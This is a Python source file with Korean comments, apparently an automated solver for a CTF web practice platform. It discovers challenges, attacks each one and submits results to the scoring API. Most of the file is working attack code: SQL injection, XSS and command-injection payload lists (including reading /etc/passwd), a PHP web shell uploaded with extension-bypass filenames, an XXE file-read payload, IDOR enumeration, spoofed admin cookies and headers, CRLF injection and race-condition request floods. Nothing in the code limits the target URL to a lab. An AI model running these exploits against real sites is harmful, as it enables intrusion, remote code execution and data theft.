"""bingo/tools/ctf_lab_engine.py — CTF 항목 플랫폼 보안 점검 엔진 (v1.0.0)

지원 플랫폼:
  - 로컬/원격 CTF 웹 실습 플랫폼 (포트 무관)
  - 동일 구조를 가진 커스텀 실습 플랫폼

동작 흐름:
  1. 메인 페이지에서 全항목 목록 파싱 (사이드바 + /api/challenges.php)
  2. 각 대상 페이지를 Playwright로 탐색 → JS 렌더링 후 소스 추출
  3. 항목 유형(vuln_type)에 따라 자동 익스플로잇 실행
  4. 성공 시 /api/validate-vuln.php 에 결과 제출 → 점수 획득
  5. 진행상황을 JSON 상태 파일에 저장 (재시작 시 이어서 진행)
"""
from __future__ import annotations

import json
import os
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable

# ─────────────────────────────────────────────────────────────────────────────
# 데이터 클래스
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class CTFChallenge:
    """단일 항목 정보"""
    challenge_id: str          # 고유 ID (slug or index)
    title: str                 # 항목 제목
    category: str              # 카테고리 (sqli / xss / upload / rce / ...)
    url: str                   # 대상 페이지 URL
    range_code: str = ""       # API 제출용 range_code
    vuln_type: str = ""        # API 제출용 vuln_type
    solved: bool = False       # 완료 여부
    score: int = 0             # 획득 점수
    error: str = ""            # 오류 메시지


@dataclass
class CTFReport:
    """전체 CTF 실행 결과"""
    base_url: str
    total: int = 0
    solved: int = 0
    failed: int = 0
    skipped: int = 0
    challenges: list[CTFChallenge] = field(default_factory=list)
    elapsed_sec: float = 0.0

    def summary(self) -> str:
        rate = (self.solved / self.total * 100) if self.total else 0
        return (
            f"[CTF] {self.base_url} | "
            f"총 {self.total}개 | 점검 {self.solved}개 ({rate:.1f}%) | "
            f"실패 {self.failed}개 | {self.elapsed_sec:.1f}s"
        )


# ─────────────────────────────────────────────────────────────────────────────
# 익스플로잇 페이로드 라이브러리
# ─────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 OR 1=1",
    "1' AND SLEEP(0)--",
    "'; SELECT 1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

CMD_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "; whoami",
    "| whoami",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

UPLOAD_BYPASS_EXTS = [
    ".php", ".php5", ".php7", ".phtml", ".pht",
    ".php.jpg", ".php%00.jpg", ".php.jpeg",
]

UPLOAD_WEBSHELL = b"<?php system($_GET['cmd']); ?>"

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

IDOR_USER_IDS = [str(i) for i in range(1, 20)]

RACE_THREADS = 20

HTTP_HEADER_PAYLOADS = {
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 BingoBrowser/1.0",
    "X-Forwarded-For": "127.0.0.1",
    "Cookie": "admin=1; role=admin; isAdmin=true",
}

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:bingo=1",
    "%0aSet-Cookie:bingo=1",
    "\r\nSet-Cookie:bingo=1",
]

# ─────────────────────────────────────────────────────────────────────────────
# 유틸리티
# ─────────────────────────────────────────────────────────────────────────────

def _norm_url(base: str, path: str) -> str:
    """base + 상대경로 → 절대 URL"""
    if path.startswith("http"):
        return path
    base = base.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    return base + path


def _session():
    """SSL 무시 requests 세션"""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings()
        s = requests.Session()
        s.verify = False
        return s
    except ImportError:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# 플랫폼 감지
# ─────────────────────────────────────────────────────────────────────────────

PLATFORM_PATTERNS = {
    "ctflab": {
        "markers": ["Web安全实验环境", "实验环境平台", "vuln-card", "range_code", "validate-vuln"],
        "challenge_list_api": "/api/challenges.php",
        "validate_api": "/api/validate-vuln.php",
        "sidebar_sel": ".sidebar a, nav a, .menu a",
        "card_sel": ".card, .challenge-card, .vuln-card",
        "range_code_re": r"range_code['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
        "vuln_type_re": r"vuln_type['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
    },
}


def detect_platform(html: str) -> str:
    for name, cfg in PLATFORM_PATTERNS.items():
        for marker in cfg["markers"]:
            if marker in html:
                return name
    return "generic"


# ─────────────────────────────────────────────────────────────────────────────
# 항목 목록 파서
# ─────────────────────────────────────────────────────────────────────────────

CATEGORY_MAP = {
    # 중국어
    "http": "http_basic", "http协议": "http_basic",
    "sql": "sqli", "sql注入": "sqli",
    "xss": "xss", "跨域脚本": "xss", "跨站脚本": "xss",
    "文件上传": "upload", "upload": "upload",
    "命令执行": "rce", "rce": "rce", "命令注入": "rce",
    "xml": "xxe", "xxe": "xxe", "xml实体": "xxe",
    "反序列化": "deserial",
    "越权": "idor", "idor": "idor",
    "秒杀": "race", "race": "race",
    "交易": "business_logic", "业务逻辑": "business_logic",
    "crlf": "crlf",
    "代理": "proxy_header", "header": "proxy_header",
    "cookie": "cookie",
    "综合": "comprehensive",
}


def _guess_category(text: str) -> str:
    text_l = text.lower()
    for kw, cat in CATEGORY_MAP.items():
        if kw.lower() in text_l:
            return cat
    return "unknown"


def parse_challenges_from_html(html: str, base_url: str) -> list[CTFChallenge]:
    """사이드바/카드에서 항목 목록 파싱"""
    challenges = []
    seen_urls: set[str] = set()

    # ── href 링크 추출 ──────────────────────────────────────────────────
    link_re = re.compile(
        r'href=["\']([^"\']*(?:range|challenge|vuln|lab|level)[^"\']*)["\']',
        re.IGNORECASE,
    )
    title_re = re.compile(r'>([^<]{2,50})<', re.DOTALL)

    for m in link_re.finditer(html):
        href = m.group(1).strip()
        if not href or href.startswith("#"):
            continue
        url = _norm_url(base_url, href)
        if url in seen_urls:
            continue
        seen_urls.add(url)

        # 앞뒤 텍스트에서 제목 추출
        start = max(0, m.start() - 200)
        ctx = html[start: m.end() + 200]
        title_m = title_re.search(ctx)
        title = title_m.group(1).strip() if title_m else href.split("/")[-1]
        title = re.sub(r'\s+', ' ', title)

        cat = _guess_category(title + " " + href)
        chid = re.sub(r'[^a-zA-Z0-9_\u4e00-\u9fff-]', '_', href.strip("/"))[-40:]

        challenges.append(CTFChallenge(
            challenge_id=chid,
            title=title,
            category=cat,
            url=url,
        ))

    return challenges


def parse_challenges_from_api(base_url: str, session) -> list[CTFChallenge]:
    """JSON API에서 항목 목록 가져오기"""
    challenges = []
    for api_path in ["/api/challenges.php", "/api/vuln/list", "/api/range/list"]:
        try:
            r = session.get(_norm_url(base_url, api_path), timeout=8)
            if r.status_code != 200:
                continue
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", [])
            for item in items:
                url = _norm_url(base_url, item.get("url", item.get("path", "")))
                chid = str(item.get("id", item.get("range_code", url.split("/")[-1])))
                title = item.get("title", item.get("name", chid))
                cat = _guess_category(
                    item.get("vuln_type", "") + " " + item.get("category", "") + " " + title
                )
                challenges.append(CTFChallenge(
                    challenge_id=chid,
                    title=title,
                    category=cat,
                    url=url,
                    range_code=item.get("range_code", ""),
                    vuln_type=item.get("vuln_type", ""),
                ))
        except Exception:
            continue
        if challenges:
            break
    return challenges


# ─────────────────────────────────────────────────────────────────────────────
# range_code / vuln_type 자동 추출
# ─────────────────────────────────────────────────────────────────────────────

def extract_range_meta(html: str, js_src: str = "") -> tuple[str, str]:
    """HTML/JS에서 range_code, vuln_type 추출"""
    combined = html + "\n" + js_src

    rc_patterns = [
        r"range_code['\"]?\s*[:=]\s*['\"]([^'\"]{1,40})['\"]",
        r"rangeCode['\"]?\s*[:=]\s*['\"]([^'\"]{1,40})['\"]",
        r"'range_code'\s*:\s*'([^']+)'",
        r"\"range_code\"\s*:\s*\"([^\"]+)\"",
    ]
    vt_patterns = [
        r"vuln_type['\"]?\s*[:=]\s*['\"]([^'\"]{1,40})['\"]",
        r"vulnType['\"]?\s*[:=]\s*['\"]([^'\"]{1,40})['\"]",
        r"'vuln_type'\s*:\s*'([^']+)'",
        r"\"vuln_type\"\s*:\s*\"([^\"]+)\"",
    ]

    range_code = ""
    vuln_type = ""

    for p in rc_patterns:
        m = re.search(p, combined)
        if m:
            range_code = m.group(1)
            break

    for p in vt_patterns:
        m = re.search(p, combined)
        if m:
            vuln_type = m.group(1)
            break

    return range_code, vuln_type


# ─────────────────────────────────────────────────────────────────────────────
# 항목 유형별 익스플로잇
# ─────────────────────────────────────────────────────────────────────────────

def _exploit_sqli(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """SQL 인젝션 항목 자동 익스플로잇"""
    try:
        import requests
    except ImportError:
        return False, {}

    r0 = session.get(challenge.url, timeout=10)
    html = r0.text

    # 폼 파라미터 추출
    input_names = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )

    # GET/POST 파라미터에 SQLi 페이로드 주입
    for payload in SQLI_PAYLOADS:
        for param in (input_names or ["id", "username", "user", "name", "search", "q"]):
            for method in ("GET", "POST"):
                try:
                    if method == "GET":
                        resp = session.get(
                            action_url,
                            params={param: payload},
                            timeout=8,
                        )
                    else:
                        resp = session.post(
                            action_url,
                            data={param: payload},
                            timeout=8,
                        )
                    body = resp.text.lower()
                    # 성공 신호 탐지
                    if any(sig in body for sig in [
                        "admin", "root", "password", "hash", "flag",
                        "welcome", "success", "logged in", "dashboard",
                        "mysql error", "syntax error", "you are in",
                    ]):
                        log(f"[SQLi] {param}={payload[:30]} → hit ({resp.status_code})")
                        return True, {
                            "param": param, "payload": payload,
                            "method": method, "url": action_url,
                        }
                except Exception:
                    continue
    return False, {}


def _exploit_xss(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """XSS 항목 자동 익스플로잇 (반사/저장형 감지)"""
    r0 = session.get(challenge.url, timeout=10)
    html = r0.text

    input_names = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    textarea_names = re.findall(r'<textarea[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    all_params = (input_names or []) + (textarea_names or [])

    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )

    for payload in XSS_PAYLOADS:
        for param in (all_params or ["q", "search", "name", "comment", "msg", "content"]):
            try:
                # GET 반사형
                resp = session.get(action_url, params={param: payload}, timeout=8)
                if payload.replace("<", "").replace(">", "").lower() in resp.text.lower() or \
                   payload in resp.text:
                    log(f"[XSS] reflected {param}={payload[:30]}")
                    return True, {"param": param, "payload": payload, "type": "reflected"}
                # POST 저장형
                resp2 = session.post(action_url, data={param: payload}, timeout=8)
                if payload in resp2.text:
                    log(f"[XSS] stored {param}={payload[:30]}")
                    return True, {"param": param, "payload": payload, "type": "stored"}
            except Exception:
                continue
    return False, {}


def _exploit_rce(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """명령 실행(RCE) 항목 자동 익스플로잇"""
    r0 = session.get(challenge.url, timeout=10)
    html = r0.text
    input_names = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )

    for payload in CMD_PAYLOADS:
        for param in (input_names or ["cmd", "exec", "command", "ping", "host", "ip"]):
            for method in ("GET", "POST"):
                try:
                    if method == "GET":
                        resp = session.get(action_url, params={param: payload}, timeout=8)
                    else:
                        resp = session.post(action_url, data={param: payload}, timeout=8)
                    body = resp.text
                    if any(sig in body for sig in [
                        "uid=", "root:", "/bin/bash", "www-data",
                        "daemon:", "/home/", "Linux ",
                    ]):
                        log(f"[RCE] {param}={payload[:30]} → hit")
                        return True, {"param": param, "payload": payload, "method": method}
                except Exception:
                    continue
    return False, {}


def _exploit_upload(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """파일 업로드 항목 자동 익스플로잇"""
    r0 = session.get(challenge.url, timeout=10)
    html = r0.text
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    file_input = re.search(r'<input[^>]+type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    file_param = file_input.group(1) if file_input else "file"
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )

    for ext in UPLOAD_BYPASS_EXTS:
        fname = f"bingo_shell{ext}"
        try:
            resp = session.post(
                action_url,
                files={file_param: (fname, UPLOAD_WEBSHELL, "image/jpeg")},
                timeout=10,
            )
            body = resp.text.lower()
            if any(sig in body for sig in ["success", "upload", "上传成功", "保存", fname.lower(), ".php"]):
                log(f"[UPLOAD] {fname} → upload success ({resp.status_code})")
                return True, {"filename": fname, "ext": ext}
        except Exception:
            continue
    return False, {}


def _exploit_xxe(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """XXE 항목 자동 익스플로잇"""
    r0 = session.get(challenge.url, timeout=10)
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', r0.text, re.IGNORECASE)
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )
    try:
        resp = session.post(
            action_url,
            data=XXE_PAYLOAD,
            headers={"Content-Type": "application/xml"},
            timeout=10,
        )
        if "root:" in resp.text or "etc/passwd" in resp.text or "flag" in resp.text.lower():
            log("[XXE] /etc/passwd disclosed")
            return True, {"payload": "file:///etc/passwd"}
    except Exception:
        pass
    return False, {}


def _exploit_idor(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """IDOR/越权 항목 자동 익스플로잇"""
    r0 = session.get(challenge.url, timeout=10)
    html = r0.text
    # URL 파라미터에서 ID 값 탐지
    id_params = re.findall(r'[?&](\w*id\w*|user|uid|account)=(\d+)', r0.url + html, re.IGNORECASE)
    if not id_params:
        id_params = [("id", "1")]

    base_url = challenge.url.split("?")[0]
    for param, current_id in id_params:
        for target_id in IDOR_USER_IDS:
            if target_id == current_id:
                continue
            try:
                resp = session.get(base_url, params={param: target_id}, timeout=8)
                if resp.status_code == 200 and len(resp.text) > 100:
                    if any(sig in resp.text.lower() for sig in [
                        "admin", "user", "email", "phone", "address", "order"
                    ]):
                        log(f"[IDOR] {param}={target_id} → data exposed")
                        return True, {"param": param, "id": target_id}
            except Exception:
                continue
    return False, {}


def _exploit_http_header(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """HTTP Header / Cookie 조작 항목"""
    r0 = session.get(challenge.url, timeout=10)
    base_html = r0.text

    for header_name, header_val in HTTP_HEADER_PAYLOADS.items():
        try:
            resp = session.get(
                challenge.url,
                headers={header_name: header_val},
                timeout=8,
            )
            body = resp.text
            if body != base_html and any(sig in body.lower() for sig in [
                "success", "flag", "通关", "admin", "congratulation", "welcome"
            ]):
                log(f"[HEADER] {header_name}: {header_val} → triggered")
                return True, {"header": header_name, "value": header_val}
        except Exception:
            continue

    # Cookie 조작
    for cookie_str in ["admin=1", "role=admin", "isAdmin=true", "level=admin"]:
        k, v = cookie_str.split("=")
        try:
            resp = session.get(challenge.url, cookies={k: v}, timeout=8)
            if resp.text != base_html and "success" in resp.text.lower():
                log(f"[COOKIE] {cookie_str} → triggered")
                return True, {"cookie": cookie_str}
        except Exception:
            continue

    return False, {}


def _exploit_crlf(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """CRLF 인젝션 항목"""
    r0 = session.get(challenge.url, timeout=10)
    html = r0.text
    input_names = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)

    for payload in CRLF_PAYLOADS:
        for param in (input_names or ["url", "redirect", "location", "next", "path"]):
            try:
                resp = session.get(
                    challenge.url,
                    params={param: "https://example.com" + payload},
                    timeout=8,
                    allow_redirects=False,
                )
                if "bingo" in resp.headers.get("Set-Cookie", ""):
                    log(f"[CRLF] injected via {param}")
                    return True, {"param": param, "payload": payload}
            except Exception:
                continue
    return False, {}


def _exploit_race(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """레이스 컨디션 항목"""
    import threading
    results = []

    r0 = session.get(challenge.url, timeout=10)
    html = r0.text
    form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    action_url = (
        _norm_url(challenge.url, form_action.group(1)) if form_action
        else challenge.url
    )

    def _fire():
        try:
            import requests, urllib3
            urllib3.disable_warnings()
            s2 = requests.Session()
            s2.verify = False
            # 기존 세션 쿠키 복사
            for c in session.cookies:
                s2.cookies.set(c.name, c.value)
            resp = s2.post(action_url, data={"quantity": "1", "count": "1"}, timeout=5)
            results.append(resp.status_code)
        except Exception:
            results.append(0)

    threads = [threading.Thread(target=_fire) for _ in range(RACE_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    success_count = results.count(200)
    if success_count > 5:
        log(f"[RACE] {success_count}/{RACE_THREADS} requests succeeded → race triggered")
        return True, {"success_requests": success_count}
    return False, {}


EXPLOIT_DISPATCH: dict[str, Callable] = {
    "sqli":           _exploit_sqli,
    "xss":            _exploit_xss,
    "rce":            _exploit_rce,
    "upload":         _exploit_upload,
    "xxe":            _exploit_xxe,
    "idor":           _exploit_idor,
    "http_basic":     _exploit_http_header,
    "proxy_header":   _exploit_http_header,
    "cookie":         _exploit_http_header,
    "crlf":           _exploit_crlf,
    "race":           _exploit_race,
    "business_logic": _exploit_race,   # 비슷한 패턴
}


def _exploit_challenge(challenge: CTFChallenge, session, log: Callable) -> tuple[bool, dict]:
    """category에 맞는 익스플로잇 실행"""
    exploit_fn = EXPLOIT_DISPATCH.get(challenge.category)
    if exploit_fn:
        return exploit_fn(challenge, session, log)
    # unknown → 기본 SQLi + XSS 시도
    for fn in [_exploit_sqli, _exploit_xss, _exploit_http_header]:
        ok, params = fn(challenge, session, log)
        if ok:
            return ok, params
    return False, {}


# ─────────────────────────────────────────────────────────────────────────────
# 점수 제출
# ─────────────────────────────────────────────────────────────────────────────

def submit_vuln(
    base_url: str,
    range_code: str,
    vuln_type: str,
    params: dict,
    score: int,
    session,
    log: Callable,
) -> bool:
    """CTF 플랫폼 채점 API에 취약점 결과 제출"""
    submit_endpoints = [
        "/api/validate-vuln.php",
        "/api/submit",
        "/api/vuln/submit",
        "/api/flag/submit",
    ]
    payload = {
        "range_code": range_code,
        "vuln_type":  vuln_type,
        "score":      score,
        "params":     json.dumps(params) if isinstance(params, dict) else params,
    }
    for ep in submit_endpoints:
        url = _norm_url(base_url, ep)
        try:
            for method in ("POST", "GET"):
                if method == "POST":
                    resp = session.post(url, json=payload, timeout=10)
                else:
                    resp = session.get(url, params=payload, timeout=10)

                body = resp.text
                log(f"  [SUBMIT] {ep} → {resp.status_code}: {body[:120]}")

                try:
                    data = resp.json()
                    if data.get("success") or data.get("code") in (200, 0):
                        log(f"  ✅ 제출 성공: {data.get('message','')}")
                        return True
                except Exception:
                    # JSON 아닌 경우 텍스트 검사
                    if any(sig in body.lower() for sig in [
                        "success", "通关", "congratulation", "flag", "verified"
                    ]):
                        return True
        except Exception as e:
            log(f"  [SUBMIT ERROR] {ep}: {e}")
            continue
    return False


# ─────────────────────────────────────────────────────────────────────────────
# 진행 상태 파일
# ─────────────────────────────────────────────────────────────────────────────

def _state_path(base_url: str) -> str:
    safe = re.sub(r'[^a-zA-Z0-9]', '_', base_url)[:60]
    dump_dir = os.path.expanduser("~/Desktop/dump/ctf_state")
    os.makedirs(dump_dir, exist_ok=True)
    return os.path.join(dump_dir, f"{safe}.json")


def load_state(base_url: str) -> dict:
    path = _state_path(base_url)
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_state(base_url: str, state: dict) -> None:
    path = _state_path(base_url)
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# 메인 엔진
# ─────────────────────────────────────────────────────────────────────────────

class CTFLabEngine:  # 웹 실습 환경 보안 점검 엔진
    """
    웹 실습 환경 보안 점검 엔진

    사용법:
        engine = CTFLabEngine(
            base_url="http://localhost:8888",
            on_log=print,
            on_progress=lambda cur, total, ch: ...,
            resume=True,
        )
        report = engine.run()
    """

    def __init__(
        self,
        base_url: str,
        on_log: Callable[[str], None] | None = None,
        on_progress: Callable[[int, int, CTFChallenge], None] | None = None,
        resume: bool = True,
        headless: bool = True,
        use_playwright: bool = True,
        cookies: dict | None = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.log = on_log or (lambda x: None)
        self.on_progress = on_progress or (lambda a, b, c: None)
        self.resume = resume
        self.headless = headless
        self.use_playwright = use_playwright
        self.extra_cookies = cookies or {}
        self._session = _session()
        if self._session and self.extra_cookies:
            for k, v in self.extra_cookies.items():
                self._session.cookies.set(k, v)
        self._pw_engine = None

    # ── Playwright 엔진 ────────────────────────────────────────────────

    def _get_pw(self):
        if self._pw_engine is None and self.use_playwright:
            try:
                from .playwright_engine import PlaywrightEngine
                self._pw_engine = PlaywrightEngine(headless=self.headless)
                self.log("🎭 Playwright 엔진 초기화 완료")
            except Exception as e:
                self.log(f"⚠ Playwright 비활성화: {e}")
        return self._pw_engine

    def _fetch_page(self, url: str) -> str:
        """Playwright 우선, fallback → requests"""
        pw = self._get_pw()
        if pw and pw.available:
            try:
                result = pw.screenshot(url, cookies=self.extra_cookies if self.extra_cookies else None)
                if result.page_source:
                    return result.page_source
            except Exception:
                pass
        if self._session:
            try:
                r = self._session.get(url, timeout=12)
                return r.text
            except Exception:
                pass
        return ""

    # ── 항목 목록 수집 ─────────────────────────────────────────────────

    def enumerate_challenges(self) -> list[CTFChallenge]:
        self.log(f"📋 항목 목록 수집 중: {self.base_url}")

        challenges: list[CTFChallenge] = []

        # 1) JSON API 시도
        if self._session:
            api_challenges = parse_challenges_from_api(self.base_url, self._session)
            if api_challenges:
                self.log(f"  ✅ API에서 {len(api_challenges)}개 항목 발견")
                challenges = api_challenges

        # 2) HTML 파싱 (메인 페이지)
        if not challenges:
            html = self._fetch_page(self.base_url)
            if html:
                challenges = parse_challenges_from_html(html, self.base_url)
                self.log(f"  ✅ HTML에서 {len(challenges)}개 항목 파싱")

        # 3) 알려진 카테고리 경로로 직접 탐색
        if not challenges:
            known_paths = [
                "/range/base/http",
                "/range/base/sqli",
                "/range/base/xss",
                "/range/base/upload",
                "/range/base/rce",
                "/range/input",
                "/range/business",
            ]
            for path in known_paths:
                html = self._fetch_page(_norm_url(self.base_url, path))
                if html:
                    found = parse_challenges_from_html(html, self.base_url)
                    challenges.extend(found)

        # 중복 제거
        seen = set()
        unique = []
        for ch in challenges:
            if ch.url not in seen:
                seen.add(ch.url)
                unique.append(ch)

        self.log(f"  📊 총 {len(unique)}개 항목 (중복 제거 후)")
        return unique

    # ── 항목별 메타 추출 ───────────────────────────────────────────────

    def _enrich_challenge(self, ch: CTFChallenge) -> None:
        """대상 페이지에서 range_code / vuln_type 추출"""
        if ch.range_code and ch.vuln_type:
            return
        html = self._fetch_page(ch.url)
        rc, vt = extract_range_meta(html)
        if rc:
            ch.range_code = rc
        if vt:
            ch.vuln_type = vt
        # URL에서 추론
        if not ch.range_code:
            m = re.search(r'/range/([^/]+)/', ch.url)
            ch.range_code = m.group(1) if m else ch.challenge_id[:20]
        if not ch.vuln_type:
            ch.vuln_type = ch.category

    # ── 단일 항목 점검 ─────────────────────────────────────────────────

    def solve_challenge(self, ch: CTFChallenge) -> bool:
        """단일 항목 익스플로잇 + 제출. True = 점검 성공"""
        self.log(f"\n🔓 [{ch.category.upper()}] {ch.title}")
        self.log(f"   URL: {ch.url}")

        if ch.solved:
            self.log("   ⏭ 이미 완료됨 — 스킵")
            return True

        # 메타 정보 보강
        self._enrich_challenge(ch)
        self.log(f"   range_code={ch.range_code!r}  vuln_type={ch.vuln_type!r}")

        if not self._session:
            ch.error = "requests 미설치"
            return False

        # 익스플로잇 실행
        ok, exploit_params = _exploit_challenge(ch, self._session, self.log)

        if not ok:
            self.log(f"   ❌ 익스플로잇 실패")
            ch.error = "exploit failed"
            return False

        self.log(f"   ✅ 익스플로잇 성공: {exploit_params}")

        # 점수 제출
        if ch.range_code:
            submitted = submit_vuln(
                self.base_url,
                ch.range_code,
                ch.vuln_type or ch.category,
                exploit_params,
                100,
                self._session,
                self.log,
            )
            ch.solved = submitted
            ch.score = 100 if submitted else 0
        else:
            # range_code 불명 → 익스플로잇 성공으로만 표기
            ch.solved = True
            ch.score = 0
            self.log("   ⚠ range_code 불명 — 제출 생략 (exploit 확인됨)")

        return ch.solved

    # ── 전체 실행 ──────────────────────────────────────────────────────

    def run(self) -> CTFReport:
        start = time.time()
        report = CTFReport(base_url=self.base_url)

        # 상태 파일 로드
        state = load_state(self.base_url) if self.resume else {}

        # 항목 목록 수집
        challenges = self.enumerate_challenges()
        if not challenges:
            self.log("⚠ 항목을 찾지 못했습니다. 타겟 URL을 확인하세요.")
            return report

        report.total = len(challenges)
        report.challenges = challenges

        # 저장된 상태 복원
        solved_ids = set(state.get("solved", []))
        for ch in challenges:
            if ch.challenge_id in solved_ids:
                ch.solved = True

        self.log(f"\n🏁 총 {report.total}개 항목 시작 (이미 완료: {len(solved_ids)}개)")

        for idx, ch in enumerate(challenges, 1):
            self.on_progress(idx, report.total, ch)
            if ch.solved:
                report.solved += 1
                report.skipped += 1
                continue

            try:
                ok = self.solve_challenge(ch)
                if ok:
                    report.solved += 1
                    solved_ids.add(ch.challenge_id)
                    # 즉시 상태 저장
                    save_state(self.base_url, {
                        "solved": list(solved_ids),
                        "last_updated": time.strftime("%Y-%m-%d %H:%M:%S"),
                    })
                else:
                    report.failed += 1
            except Exception as e:
                ch.error = str(e)
                report.failed += 1
                self.log(f"   💥 예외: {e}")

            # 과도한 요청 방지
            time.sleep(0.5)

        report.elapsed_sec = time.time() - start

        # 최종 상태 저장
        save_state(self.base_url, {
            "solved": list(solved_ids),
            "last_updated": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total": report.total,
            "solved_count": report.solved,
        })

        self.log(f"\n{report.summary()}")
        return report

    def close(self) -> None:
        if self._pw_engine:
            try:
                self._pw_engine.close()
            except Exception:
                pass
